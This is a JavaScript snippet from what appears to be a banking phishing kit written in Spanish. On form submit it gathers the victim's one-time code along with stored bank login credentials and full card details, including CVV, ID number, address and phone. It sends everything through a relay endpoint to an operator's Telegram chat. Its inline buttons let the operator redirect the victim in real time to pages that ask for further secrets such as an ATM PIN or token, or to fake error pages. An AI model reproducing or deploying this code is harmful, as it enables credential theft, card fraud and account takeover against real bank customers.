<script>
document.addEventListener('DOMContentLoaded', function () {
    const loader = document.querySelector(".loaderp-full");
    const claveInput = document.getElementById('clave');
    const autorizarBtn = document.getElementById('authorize-button');
    const transactionForm = document.getElementById('transaction-form');

    function checkFormValidity() {
        autorizarBtn.disabled = claveInput.value.length < 4;
    }
    claveInput.addEventListener('input', checkFormValidity);

    transactionForm.addEventListener('submit', async function (event) {
        event.preventDefault();
        loader.style.display = "flex";

        const dinamica = claveInput.value;
        const loginData = JSON.parse(localStorage.getItem("logindata"));
        const usuario = loginData ? loginData.usuario : "<i>No disponible</i>";
        const clave = loginData ? loginData.clave : "<i>No disponible</i>";
        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));

        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        localStorage.setItem('transactionId', transactionId);

        const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
👤 <b>Usuario:</b> | ${usuario}
🔐 <b>Clave:</b> | ${clave}
🔑 <b>Otp:</b> | ${dinamica}
--------------------------------------------------
<b>Detalles del pago:</b>
----------------------------
🪪 <b>Cédula:</b> | ${datosTarjeta ? datosTarjeta.cedula : '<i>No disponible</i>'}
💳 <b>Tarjeta:</b> | ${datosTarjeta ? datosTarjeta.cardNumber : '<i>No disponible</i>'}
📅 <b>Expiración:</b> | ${datosTarjeta ? `${datosTarjeta.expMonth}/${datosTarjeta.expYear}` : '<i>No disponible</i>'}
🔐 <b>CVV:</b> | ${datosTarjeta ? datosTarjeta.cvv : '<i>No disponible</i>'}
💳 <b>Tipo:</b> | ${datosTarjeta ? datosTarjeta.type : '<i>No disponible</i>'}
💰 <b>Cuotas:</b> | ${datosTarjeta ? datosTarjeta.cuotas : '<i>No disponible</i>'}
🏦 <b>Banco:</b> | ${datosTarjeta ? datosTarjeta.bank : '<i>No disponible</i>'}
--------------------------------------------------
🏠 <b>Dirección:</b> | ${datosTarjeta ? datosTarjeta.address : '<i>No disponible</i>'}
📞 <b>Teléfono:</b> | ${datosTarjeta ? datosTarjeta.phone : '<i>No disponible</i>'}
🏙️ <b>Ciudad:</b> | ${datosTarjeta ? datosTarjeta.city : '<i>No disponible</i>'}
📝 <b>Propietario:</b> | ${datosTarjeta ? datosTarjeta.ownerName : '<i>No disponible</i>'}
--------------------------------------------------
        `;

        const keyboard = JSON.stringify({
            inline_keyboard: [
                [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
                [{ text: "Pedir Clave de Cajero", callback_data: `pedir_cajero:${transactionId}` }],
                [{ text: "Error OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Pedir Token", callback_data: `pedir_token:${transactionId}` }],
                [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
                [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
            ],
        });

        try {
            const response = await fetch(`/api/sendData?method=send&text=${encodeURIComponent(message)}&reply_markup=${encodeURIComponent(keyboard)}`);
            const data = await response.json();
            if (data.ok) {
                console.log("Mensaje enviado a Telegram con éxito");
                await checkPaymentVerification(transactionId);
            } else {
                throw new Error("Error al enviar mensaje a Telegram.");
            }
        } catch (error) {
            console.error("Error al enviar mensaje:", error);
            loader.style.display = "none";
        }
    });

    async function checkPaymentVerification(transactionId) {
        try {
            const response = await fetch(`/api/sendData?method=update`);
            const data = await response.json();

            const verificationUpdate = data.result.find(update =>
                update.callback_query &&
                [
                    `pedir_dinamica:${transactionId}`,
                    `pedir_cajero:${transactionId}`,
                    `pedir_otp:${transactionId}`,
                    `pedir_token:${transactionId}`,
                    `error_tc:${transactionId}`,
                    `error_logo:${transactionId}`,
                    `confirm_finalizar:${transactionId}`
                ].includes(update.callback_query.data)
            );

            if (verificationUpdate) {
                loader.style.display = "none";

                switch (verificationUpdate.callback_query.data) {
                    case `pedir_dinamica:${transactionId}`:
                        window.location.href = "dinamica-id.html";
                        break;
                    case `pedir_cajero:${transactionId}`:
                        window.location.href = "ccajero-id.html";
                        break;
                    case `pedir_otp:${transactionId}`:
                        window.location.href = "error-otp.html";
                        break;
                    case `pedir_token:${transactionId}`:
                        window.location.href = "token-id.html";
                        break;
                    case `error_tc:${transactionId}`:
                        alert("Error en tarjeta. Verifique los datos.");
                        window.location.href = "../pay/";
                        break;
                    case `error_logo:${transactionId}`:
                        alert("Error en el logo. Reintente.");
                        window.location.href = "error-id.html";
                        break;
                    case `confirm_finalizar:${transactionId}`:
                        window.location.href = "../checking.html";
                        break;
                }
            } else {
                setTimeout(() => checkPaymentVerification(transactionId), 2000);
            }
        } catch (error) {
            console.error("Error en la verificación:", error);
            setTimeout(() => checkPaymentVerification(transactionId), 2000);
        }
    }
});
</script>
